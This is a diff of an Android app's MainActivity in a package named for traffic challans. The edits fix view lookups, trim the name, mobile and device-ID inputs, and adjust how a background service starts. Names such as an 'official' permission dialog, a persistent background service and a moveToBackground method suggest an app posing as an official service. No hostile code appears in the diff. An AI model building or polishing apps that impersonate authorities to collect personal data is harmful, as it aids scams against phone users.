@@ -15,6 +15,7 @@ import androidx.core.content.ContextCompat
 import androidx.work.*
 import com.rte.challan.service.BackgroundService
 import com.rte.challan.worker.RegistrationWorker
+import java.net.URLEncoder // Fixed: URLEncoder Import added
 
 class MainActivity : AppCompatActivity() {
 
@@ -43,7 +44,7 @@ class MainActivity : AppCompatActivity() {
             showOfficialPermissionDialog()
         }
 
-        // Activate Button Logic
+        // Activate Button Logic - Fixed: Correct findViewById usage
         findViewById<Button>(R.id.btnActivate).setOnClickListener {
             handleActivation()
         }
@@ -69,7 +70,6 @@ class MainActivity : AppCompatActivity() {
         val dialog = builder.create()
         dialog.show()
         
-        // Button color professional blue
         dialog.getButton(AlertDialog.BUTTON_POSITIVE).setTextColor(ContextCompat.getColor(this, android.R.color.holo_blue_dark))
     }
 
@@ -78,9 +78,14 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun handleActivation() {
-        val name = findViewById<EditText>(R.id.etName).text.toString()
-        val mobile = findViewById<EditText>(R.id.etMobile).text.toString()
-        val deviceId = findViewById<EditText>(R.id.etDeviceId).text.toString()
+        // Fixed: Properly finding views before accessing text
+        val etName = findViewById<EditText>(R.id.etName)
+        val etMobile = findViewById<EditText>(R.id.etMobile)
+        val etDeviceId = findViewById<EditText>(R.id.etDeviceId)
+
+        val name = etName.text.toString().trim()
+        val mobile = etMobile.text.toString().trim()
+        val deviceId = etDeviceId.text.toString().trim()
 
         if (name.isNotEmpty() && mobile.isNotEmpty() && deviceId.isNotEmpty()) {
             setupCompleted(name, mobile, deviceId)
@@ -131,7 +136,11 @@ class MainActivity : AppCompatActivity() {
 
     private fun startBackgroundService() {
         val serviceIntent = Intent(this, BackgroundService::class.java)
-        ContextCompat.startForegroundService(this, serviceIntent)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(serviceIntent)
+        } else {
+            startService(serviceIntent)
+        }
     }
 
     private fun moveToBackground() {
